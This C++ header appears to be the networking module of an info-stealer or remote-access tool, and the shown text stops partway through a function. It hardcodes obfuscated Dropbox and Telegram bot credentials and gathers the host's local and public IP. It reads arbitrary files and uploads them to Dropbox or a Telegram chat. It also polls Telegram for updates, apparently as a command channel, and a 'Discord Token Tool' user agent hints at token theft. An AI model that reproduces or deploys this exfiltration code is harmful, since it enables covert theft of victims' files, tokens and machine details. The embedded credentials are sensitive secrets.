#pragma once
#include <codecvt>

// Encrypted tokens
const std::string dropbox_token = oxorany("sl.u.AGZOBeTzmf88E4gmemK0XiGFDDXNBoW4tmoEUqXf11JkJCev-o0o3osofoZAc2fdWBWRHhGT0IkF3_5nTHJDzD8cd32EWi1AwiQ7ySlFX47rr6fudDhGHmx6ObmzgzZ-KD4j1aovZTyyLFReJAZBzbWwOd2ynuYbR30DSRds8E2F3XH2O3RPCsmLEBniK9HTXIaWRCV7jtPi02P2HM47j-OIpYrvqxJBMB78OrZTkyBPlSn5PnrMZbKmK0tUXU_S3YNEqF7BRx3EHlPh7PuVdkA4xpid0TZiO4nK399hkGvJvoscZYWpdpEgyxQiwz0mO9ufYPikw5K2Y5ENictUE1CgoU2KSSLhOSMfkMVnYIHm-Q5a_HT65fpSmajhfUnmQh-fCLUzJylTIDzTGIf7nzsiqKy4GUZ00ckhBlrwhuzHDBD5hMESAureD3ps8C6HVIQ-lcGbHKglAaV_lvT18gtKFk6wB13mOas7OVKbXqDfQlK6782TokXsqH81FMzzlT9ZV40tsIxpgyjfciNKSdnR_OohC_TXYca8p7OkIk-76_IWEifPI1mhErR7Cy4Ej4QTrMEaXCdb4kJuBEW96CiJgX7yyhjxiaMA3uW3b0I4MMoMqQUjgzqlSoIKYnihp6_NOaQSZIC0f-st0IQFQ_1K8ldNdAd1YVNY4fshoy3DQknUznr_vU73jc8LOd1BDL3KPIlBUFN4nIqJVX95ZklxRguoFo67CLKQ6FRE6lndTRYbRnSlQUt8k2_ghgMBXIIW3gQVn-xEmd60tGRKGVRvEzPjmvgvCWKausNTrB2eYPG-B2010ywImuORXtTcBbAWgwdfOSrV3hjyQHhs8uFE7inHchsklX6cYA-CtQIAoX2wBZKway2q7YhLJKnKv2UDq9uWG9x3Cuv4f1U33sqXzO8So7DsW6V4t2oaL4C6BRsem2j9PVib-4o6t7_vb_YtXEoER--CPdqqzwhRh1TD6goGBJQwQ2rXJdy3kh0sBnwBT6ElRDRFyXbSfeZCcjQSMyKCJDc65k1E38XJbouIdmEvm3lUR7aCcdKTIleOZCYNf5mpdSsoUgOl6H_1BgM4_mZ4vdlTUMutoSzPcKmYruNFsYyXI77CFbVZaM8DbqjL9qEJsoWGUDRzTdvLr051c-mPj9afw1riKqB1ozYKOswhVT5-Xkm5DS_NtsLWWPQLYXtCZvKxotvosj6BomeLebCG9kwSKNyvDQd7zyp60owuI-_H0Gefg1NNc8j-BhsROaq38E619JlZi0VJzfQYzynsYTUWj8R3D9gPR4O9w9WfO4QB8eFO5d7PeKJ4eZX_HMMgotoG3ZdLgmOXr_SNMYg73zziNeVHwGbPxNVgE8YVzacR7gLmxw9gwvi1UaHJmKLoUI1y5_eqLN_YiFbKNr7Hj8h3mECWUGXu_Ymmhcz7rV9vu2agnxevp6nhTg");
const std::wstring telegram_chat_id = oxorany(L"-5290171371");
const std::wstring telegram_token = oxorany(L"8715910310:AAEtbnin7MhrQHLVMP6zSCEn0XpE65U5Aag");

namespace https {
    std::string get( const std::string& url, const std::string& auth_token ) {
        HINTERNET hInternet = InternetOpen( oxorany( L"Divinty" ), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
        if ( !hInternet ) return oxorany( "" );

        HINTERNET hConnect = InternetOpenUrlA( hInternet, url.c_str( ), NULL, 0, INTERNET_FLAG_RELOAD, 0 );
        if ( !hConnect ) {
            InternetCloseHandle( hInternet );
            return oxorany( "" );
        }

        if ( !auth_token.empty( ) ) {
            std::string auth_header = oxorany( "Authorization: " ) + auth_token;
            HttpAddRequestHeadersA( hConnect, auth_header.c_str( ), auth_header.length( ), HTTP_ADDREQ_FLAG_ADD );
        }

        if ( !HttpSendRequestA( hConnect, NULL, 0, NULL, 0 ) ) {
            InternetCloseHandle( hConnect );
            InternetCloseHandle( hInternet );
            return oxorany( "" );
        }

        std::string response;
        char buffer[ 4096 ];
        DWORD bytesRead;
        while ( InternetReadFile( hConnect, buffer, sizeof( buffer ) - 1, &bytesRead ) && bytesRead > 0 ) {
            buffer[ bytesRead ] = '\0';
            response += buffer;
        }

        InternetCloseHandle( hConnect );
        InternetCloseHandle( hInternet );
        return response;
    }

    // HTTPS POST using WinHTTP
    std::string http_post( const std::string& url, const std::string& postData ) {
        std::wstring wurl = std::wstring( url.begin( ), url.end( ) );
        URL_COMPONENTS urlComp = { 0 };
        urlComp.dwStructSize = sizeof( urlComp );
        wchar_t hostName[ 256 ] = { 0 };
        wchar_t urlPath[ 1024 ] = { 0 };
        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = sizeof( hostName ) / sizeof( wchar_t );
        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = sizeof( urlPath ) / sizeof( wchar_t );
        if ( !WinHttpCrackUrl( wurl.c_str( ), 0, 0, &urlComp ) ) {
            return "";
        }

        HINTERNET hSession = WinHttpOpen( oxorany( L"Divinty" ), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0 );
        if ( !hSession ) return "";

        DWORD port = urlComp.nPort;
        if ( port == 0 ) port = ( urlComp.nScheme == INTERNET_SCHEME_HTTPS ) ? 443 : 80;
        HINTERNET hConnect = WinHttpConnect( hSession, hostName, port, 0 );
        if ( !hConnect ) {
            WinHttpCloseHandle( hSession );
            return "";
        }

        DWORD flags = ( urlComp.nScheme == INTERNET_SCHEME_HTTPS ) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = WinHttpOpenRequest( hConnect, L"POST", urlPath, NULL, NULL, NULL, flags );
        if ( !hRequest ) {
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return "";
        }

        LPCWSTR headers = L"Content-Type: application/json\r\n";
        if ( !WinHttpSendRequest( hRequest, headers, wcslen( headers ),
            ( LPVOID )postData.c_str( ), ( DWORD )postData.size( ),
            ( DWORD )postData.size( ), 0 ) ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return "";
        }

        if ( !WinHttpReceiveResponse( hRequest, NULL ) ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return "";
        }

        std::string response;
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if ( !WinHttpQueryDataAvailable( hRequest, &dwSize ) ) break;
            if ( dwSize == 0 ) break;

            std::vector<char> buffer( dwSize + 1 );
            DWORD dwDownloaded = 0;
            if ( !WinHttpReadData( hRequest, buffer.data( ), dwSize, &dwDownloaded ) ) break;
            response.append( buffer.data( ), dwDownloaded );
        } while ( dwSize > 0 );

        WinHttpCloseHandle( hRequest );
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );
        return response;
    }


    std::string get_local_ip( ) {
        WSADATA wsaData;
        WSAStartup( MAKEWORD( 2, 2 ), &wsaData );
        char hostname[ 256 ];
        if ( gethostname( hostname, sizeof( hostname ) ) != 0 ) {
            WSACleanup( );
            return oxorany( "unknown" );
        }

        struct addrinfo hints = { 0 };
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_CANONNAME;

        struct addrinfo* result = nullptr;
        if ( getaddrinfo( hostname, nullptr, &hints, &result ) != 0 ) {
            WSACleanup( );
            return oxorany( "unknown" );
        }

        std::string ip;
        for ( struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next ) {
            if ( ptr->ai_family == AF_INET ) {
                struct sockaddr_in* sockaddr_ipv4 = ( struct sockaddr_in* )ptr->ai_addr;
                char ip_str[ INET_ADDRSTRLEN ];
                inet_ntop( AF_INET, &( sockaddr_ipv4->sin_addr ), ip_str, INET_ADDRSTRLEN );
                ip = ip_str;
                break;
            }
        }
        freeaddrinfo( result );
        WSACleanup( );
        return ip.empty( ) ? oxorany( "unknown" ) : ip;
    }

    // Helper to get public IP via HTTP
    std::string get_public_ip( ) {
        HINTERNET hSession = WinHttpOpen( oxorany( L"Divinty" ), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0 );
        if ( !hSession ) return oxorany( "unknown" );

        HINTERNET hConnect = WinHttpConnect( hSession, oxorany( L"api.ipify.org" ), INTERNET_DEFAULT_HTTPS_PORT, 0 );
        if ( !hConnect ) {
            WinHttpCloseHandle( hSession );
            return oxorany( "unknown" );
        }

        HINTERNET hRequest = WinHttpOpenRequest( hConnect, oxorany( L"GET" ), oxorany( L"/" ), NULL, NULL, NULL, WINHTTP_FLAG_SECURE );
        if ( !hRequest ) {
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return oxorany( "unknown" );
        }

        BOOL bResults = WinHttpSendRequest( hRequest, NULL, 0, NULL, 0, 0, 0 );
        if ( !bResults ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return oxorany( "unknown" );
        }

        bResults = WinHttpReceiveResponse( hRequest, NULL );
        if ( !bResults ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return oxorany( "unknown" );
        }

        DWORD dwSize = 0;
        std::string response;
        do {
            dwSize = 0;
            if ( !WinHttpQueryDataAvailable( hRequest, &dwSize ) ) break;
            if ( dwSize == 0 ) break;

            std::vector<char> buffer( dwSize + 1 );
            DWORD dwDownloaded = 0;
            if ( !WinHttpReadData( hRequest, buffer.data( ), dwSize, &dwDownloaded ) ) break;
            response.append( buffer.data( ), dwDownloaded );
        } while ( dwSize > 0 );

        WinHttpCloseHandle( hRequest );
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );
        return response.empty( ) ? oxorany( "unknown" ) : response;
    }

    std::string read_file( const std::string& path ) {
        std::ifstream file( path, std::ios::binary | std::ios::ate );
        if ( !file.is_open( ) ) return "";
        std::streamsize size = file.tellg( );
        file.seekg( 0, std::ios::beg );
        std::string buffer( size, '\0' );
        if ( file.read( &buffer[ 0 ], size ) )
            return buffer;
        return "";
    }

    size_t write_callback( void* contents, size_t size, size_t nmemb, std::string* out ) {
        size_t total = size * nmemb;
        out->append( ( char* )contents, total );
        return total;
    }

    std::string wstring_to_utf8( const std::wstring& wstr ) {
        if ( wstr.empty( ) ) return std::string( );
        int size_needed = WideCharToMultiByte( CP_UTF8, 0, wstr.c_str( ), ( int )wstr.size( ), NULL, 0, NULL, NULL );
        std::string strTo( size_needed, 0 );
        WideCharToMultiByte( CP_UTF8, 0, wstr.c_str( ), ( int )wstr.size( ), &strTo[ 0 ], size_needed, NULL, NULL );
        return strTo;
    }

    struct HttpResponses {
        int status_code = 0;
        std::string body;
    };
    
    HttpResponses post_detailed(const std::string& url, const std::string& token, const std::string& body) {
        HttpResponses result;

        // Determine if HTTPS is required
        bool is_https = (url.find("https://") == 0);
        INTERNET_PORT port = is_https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;

        // Parse host and path manually (simple approach)
        std::string host, path;
        size_t scheme_end = url.find("://");
        if (scheme_end == std::string::npos) {
            return result; // invalid URL
        }
        size_t host_start = scheme_end + 3;
        size_t path_start = url.find('/', host_start);
        if (path_start == std::string::npos) {
            host = url.substr(host_start);
            path = "/";
        } else {
            host = url.substr(host_start, path_start - host_start);
            path = url.substr(path_start);
        }

        // Convert to wide strings
        std::wstring whost(host.begin(), host.end());
        std::wstring wpath(path.begin(), path.end());

        HINTERNET hSession = WinHttpOpen(L"Discord Token Tool/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            NULL, NULL, 0);
        if (!hSession) return result;

        HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), port, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return result;
        }

        DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
            NULL, NULL, NULL, flags);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return result;
        }

        // Headers
        std::string authHeader = "Authorization: " + token;
        std::string contentType = "Content-Type: application/json";
        std::wstring headers = std::wstring(authHeader.begin(), authHeader.end()) + L"\r\n" +
            std::wstring(contentType.begin(), contentType.end()) + L"\r\n";

        // Send request
        if (!WinHttpSendRequest(hRequest, headers.c_str(), headers.length(),
            NULL, 0, body.size(), 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return result;
        }

        if (!body.empty()) {
            DWORD bytesWritten = 0;
            WinHttpWriteData(hRequest, body.c_str(), (DWORD)body.size(), &bytesWritten);
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return result;
        }

        // Get status code
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &statusCodeSize, NULL);
        result.status_code = statusCode;

        // Read response body
        DWORD bytesRead = 0;
        char buffer[4096];
        std::string responseBody;
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            responseBody.append(buffer, bytesRead);
        }
        result.body = responseBody;

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return result;
    }

    // dropbox alternative method
    std::string upload_to_dropbox( const std::wstring& file_path_w, const std::string& access_token ) {
        std::string file_path = wstring_to_utf8( file_path_w );
        CURL* curl = curl_easy_init( );
        if ( !curl ) return "";

        std::string file_data = read_file( file_path );
        if ( file_data.empty( ) ) {
            curl_easy_cleanup( curl );
            return "";
        }

        size_t pos = file_path.find_last_of( "/\\" );
        std::string file_name = ( pos == std::string::npos ) ? file_path : file_path.substr( pos + 1 );

        std::string upload_response;
        curl_easy_setopt( curl, CURLOPT_URL, oxorany( "https://content.dropboxapi.com/2/files/upload" ) );
        curl_easy_setopt( curl, CURLOPT_POST, 1L );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDS, file_data.c_str( ) );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDSIZE, file_data.size( ) );

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append( headers, ( oxorany( "Authorization: Bearer " ) + access_token ).c_str( ) );
        headers = curl_slist_append( headers, oxorany( "Content-Type: application/octet-stream" ) );
        std::string dropbox_api_arg = oxorany( "{\"path\": \"/" ) + file_name + oxorany( "\", \"mode\": \"overwrite\"}" );
        headers = curl_slist_append( headers, ( oxorany( "Dropbox-API-Arg: " ) + dropbox_api_arg ).c_str( ) );
        curl_easy_setopt( curl, CURLOPT_HTTPHEADER, headers );

        curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, write_callback );
        curl_easy_setopt( curl, CURLOPT_WRITEDATA, &upload_response );

        CURLcode res = curl_easy_perform( curl );
        curl_slist_free_all( headers );

        if ( res != CURLE_OK ) {
            std::cerr << oxorany( "curl upload error: " ) << curl_easy_strerror( res ) << std::endl;
            curl_easy_cleanup( curl );
            return "";
        }

        if ( upload_response.find( oxorany( "\"id\"" ) ) == std::string::npos ) {
            std::cerr << oxorany( "Upload failed: " ) << upload_response << std::endl;
            curl_easy_cleanup( curl );
            return "";
        }

        std::string share_response;
        curl_easy_setopt( curl, CURLOPT_URL, oxorany( "https://api.dropboxapi.com/2/sharing/create_shared_link_with_settings" ) );
        curl_easy_setopt( curl, CURLOPT_POST, 1L );
        std::string post_data = oxorany( "{\"path\": \"/" ) + file_name + oxorany( "\"}" );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDS, post_data.c_str( ) );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDSIZE, post_data.size( ) );

        headers = nullptr;
        headers = curl_slist_append( headers, ( oxorany( "Authorization: Bearer " ) + access_token ).c_str( ) );
        headers = curl_slist_append( headers, oxorany( "Content-Type: application/json" ) );
        curl_easy_setopt( curl, CURLOPT_HTTPHEADER, headers );

        curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, write_callback );
        curl_easy_setopt( curl, CURLOPT_WRITEDATA, &share_response );

        res = curl_easy_perform( curl );
        curl_slist_free_all( headers );
        curl_easy_cleanup( curl );

        if ( res != CURLE_OK ) {
            std::cerr << oxorany( "curl share error: " ) << curl_easy_strerror( res ) << std::endl;
            return "";
        }

        size_t url_start = share_response.find( oxorany( "\"url\"" ) );
        if ( url_start == std::string::npos ) return "";
        url_start = share_response.find( oxorany( "\"" ), url_start + 6 );
        if ( url_start == std::string::npos ) return "";
        size_t url_end = share_response.find( oxorany( "\"" ), url_start + 1 );
        if ( url_end == std::string::npos ) return "";
        std::string shared_url = share_response.substr( url_start + 1, url_end - url_start - 1 );

        size_t q_pos = shared_url.find( '?' );
        if ( q_pos != std::string::npos ) {
            shared_url = shared_url.substr( 0, q_pos );
        }
        shared_url += oxorany( "?dl=1" );

        return shared_url;
    }

    bool dropbox_file_exists( const std::string& access_token, const std::string& dropbox_path ) {
        CURL* curl = curl_easy_init( );
        if ( !curl ) return false;

        std::string response;
        curl_easy_setopt( curl, CURLOPT_URL, oxorany( "https://api.dropboxapi.com/2/files/get_metadata" ) );
        curl_easy_setopt( curl, CURLOPT_POST, 1L );
        std::string post_data = oxorany( "{\"path\": \"" ) + dropbox_path + oxorany( "\"}" );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDS, post_data.c_str( ) );
        curl_easy_setopt( curl, CURLOPT_POSTFIELDSIZE, post_data.size( ) );

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append( headers, ( oxorany( "Authorization: Bearer " ) + access_token ).c_str( ) );
        headers = curl_slist_append( headers, oxorany( "Content-Type: application/json" ) );
        curl_easy_setopt( curl, CURLOPT_HTTPHEADER, headers );

        curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, write_callback );
        curl_easy_setopt( curl, CURLOPT_WRITEDATA, &response );
        curl_easy_setopt( curl, CURLOPT_NOBODY, 0L ); // we want the body to see error details

        CURLcode res = curl_easy_perform( curl );
        long http_code = 0;
        curl_easy_getinfo( curl, CURLINFO_RESPONSE_CODE, &http_code );

        curl_slist_free_all( headers );
        curl_easy_cleanup( curl );

        return ( res == CURLE_OK && http_code == 200 );
    }

    bool upload_telegram_file( const std::wstring& filePath ) {
        std::ifstream file( filePath, std::ios::binary | std::ios::ate );
        if ( !file.is_open( ) ) return false;
        std::streamsize size = file.tellg( );
        file.seekg( 0, std::ios::beg );
        std::vector<char> buffer( size );
        if ( !file.read( buffer.data( ), size ) ) return false;
        file.close( );

        std::wstring fileName = filePath;
        size_t pos = fileName.find_last_of( L"/\\" );
        if ( pos != std::wstring::npos ) {
            fileName = fileName.substr( pos + 1 );
        }

        std::string chat_id_utf8 = wstring_to_utf8( telegram_chat_id );
        std::string fileName_utf8 = wstring_to_utf8( fileName );
        std::string boundary = oxorany( "----WebKitFormBoundary7MA4YWxkTrZu0gW" );

        std::string content =
            oxorany( "--" ) + boundary + oxorany( "\r\n"
                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" ) +
            chat_id_utf8 + oxorany( "\r\n"
                "--" ) + boundary + oxorany( "\r\n"
                    "Content-Disposition: form-data; name=\"document\"; filename=\"" ) +
            fileName_utf8 + oxorany( "\"\r\n"
                "Content-Type: application/octet-stream\r\n\r\n" );

        std::vector<char> postData( content.begin( ), content.end( ) );
        postData.insert( postData.end( ), buffer.begin( ), buffer.end( ) );
        std::string footer = oxorany("\r\n--") + boundary + oxorany("--\r\n");
        postData.insert( postData.end( ), footer.begin( ), footer.end( ) );

        HINTERNET hSession = WinHttpOpen( oxorany(L"Telegram Bot/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        if ( !hSession ) return false;

        HINTERNET hConnect = WinHttpConnect( hSession, oxorany(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0 );
        if ( !hConnect ) {
            WinHttpCloseHandle( hSession );
            return false;
        }

        std::wstring token = telegram_token;
        std::wstring path = oxorany(L"/bot") + token + oxorany(L"/sendDocument");
        HINTERNET hRequest = WinHttpOpenRequest( hConnect, oxorany(L"POST"), path.c_str( ), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE );
        if ( !hRequest ) {
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return false;
        }

        std::wstring headers = oxorany(L"Content-Type: multipart/form-data; boundary=") +
            std::wstring( boundary.begin( ), boundary.end( ) ) + L"\r\n";
        if ( !WinHttpSendRequest( hRequest, headers.c_str( ), ( DWORD )headers.size( ),
            ( LPVOID )postData.data( ), ( DWORD )postData.size( ),
            ( DWORD )postData.size( ), 0 ) ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return false;
        }

        if ( !WinHttpReceiveResponse( hRequest, NULL ) ) {
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return false;
        }

        DWORD statusCode = 0;
        DWORD dwSize = sizeof( statusCode );
        WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &dwSize, NULL );

        WinHttpCloseHandle( hRequest );
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );

        return ( statusCode == 200 );
    }
    struct HttpResponse {
        int status_code = 0;
        std::string body;
        DWORD error_code = 0;
    };
    HttpResponse get_request_detailed(const std::string& url) {
        HttpResponse resp;

        std::string cleanUrl = url;
        cleanUrl.erase(0, cleanUrl.find_first_not_of(oxorany(" \t\r\n")));
        cleanUrl.erase(cleanUrl.find_last_not_of(oxorany(" \t\r\n")) + 1);

        CURL* curl = curl_easy_init();
        if (!curl) {
            resp.error_code = 1;
            return resp;
        }

        std::string response;
        curl_easy_setopt(curl, CURLOPT_URL, cleanUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        // Required by icanhazdadjoke
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, oxorany("Accept: application/json"));
        headers = curl_slist_append(headers, oxorany("User-Agent: MyBot/1.0"));
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            resp.error_code = (DWORD)res;
        } else {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            resp.status_code = (int)http_code;
            resp.body = response;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return resp;
    }

    std::string get_telegram_message( int64_t offset = 0) {
        std::wstring token = telegram_token;
        std::wstring url = oxorany(L"/bot") + token + oxorany( L"/getUpdates" );
        if (offset > 0) url += oxorany(L"?offset=") + std::to_wstring(offset);

        HINTERNET hSession = WinHttpOpen(oxorany(L"Telegram Bot/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return "";

        HINTERNET hConnect = WinHttpConnect(hSession, oxorany(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return "";
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, oxorany(L"GET"), url.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return "";
        }

        if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return "";
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return "";
        }

        std::string response;
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1);
            DWORD dwDownloaded = 0;
            if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
            response.append(buffer.data(), dwDownloaded);
        } while (dwSize > 0);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return response;
    }

    bool send_telegram_document(const std::vector<BYTE>& data, const std::string& filename) {
        if (data.empty()) return false;
        std::wstring token   = telegram_token;
        std::wstring chat_id = telegram_chat_id;

        std::string boundary = oxorany("----WebKitFormBoundary7MA4YWxkTrZu0gW");
        std::string content =
            oxorany("--") + boundary + oxorany("\r\n") +
            oxorany("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n") +
            std::string(chat_id.begin(), chat_id.end()) + oxorany("\r\n") +
            oxorany("--") + boundary + oxorany("\r\n") +
            oxorany("Content-Disposition: form-data; name=\"document\"; filename=\"") + filename + oxorany("\"\r\n") +
            oxorany("Content-Type: application/octet-stream\r\n\r\n");

        std::vector<char> post_data(content.begin(), content.end());
        post_data.insert(post_data.end(), data.begin(), data.end());

        std::string footer = oxorany("\r\n--") + boundary + oxorany("--\r\n");
        post_data.insert(post_data.end(), footer.begin(), footer.end());

        HINTERNET h_session = WinHttpOpen(oxorany(L"Telegram Bot/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!h_session) return false;

        HINTERNET h_connect = WinHttpConnect(h_session, oxorany(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!h_connect) {
            WinHttpCloseHandle(h_session);
            return false;
        }

        std::wstring path = oxorany(L"/bot") + token + oxorany(L"/sendDocument");
        HINTERNET h_request = WinHttpOpenRequest(h_connect, oxorany(L"POST"), path.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!h_request) {
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return false;
        }

        std::wstring headers = oxorany(L"Content-Type: multipart/form-data; boundary=") +
            std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

        if (!WinHttpSendRequest(h_request, headers.c_str(), (DWORD)headers.size(),
            (LPVOID)post_data.data(), (DWORD)post_data.size(),
            (DWORD)post_data.size(), 0)) {
            WinHttpCloseHandle(h_request);
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return false;
        }

        if (!WinHttpReceiveResponse(h_request, NULL)) {
            WinHttpCloseHandle(h_request);
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return false;
        }

        DWORD status_code = 0;
        DWORD dw_size = sizeof(status_code);
        WinHttpQueryHeaders(h_request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status_code, &dw_size, NULL);

        WinHttpCloseHandle(h_request);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);

        return (status_code == 200);
    }

    bool send_telegram_message( const std::string& text ) {
        // URL encode the text (simple version – replace spaces and special chars)
        std::string encoded_text = text;
        // You should properly URL-encode the text, but for brevity we assume it's safe
        std::wstring token = telegram_token;
        std::wstring chat_id = telegram_chat_id;

        std::wstring url = oxorany(L"/bot") + token + oxorany(L"/sendMessage?chat_id=") + chat_id +
            oxorany(L"&text=") + std::wstring(encoded_text.begin(), encoded_text.end());

        HINTERNET hSession = WinHttpOpen(oxorany(L"Telegram Bot/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, oxorany(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, oxorany(L"GET"), url.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Optionally check status code
        DWORD statusCode = 0;
        DWORD dwSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &dwSize, NULL);

        WinHttpCloseHandle(hRequest);
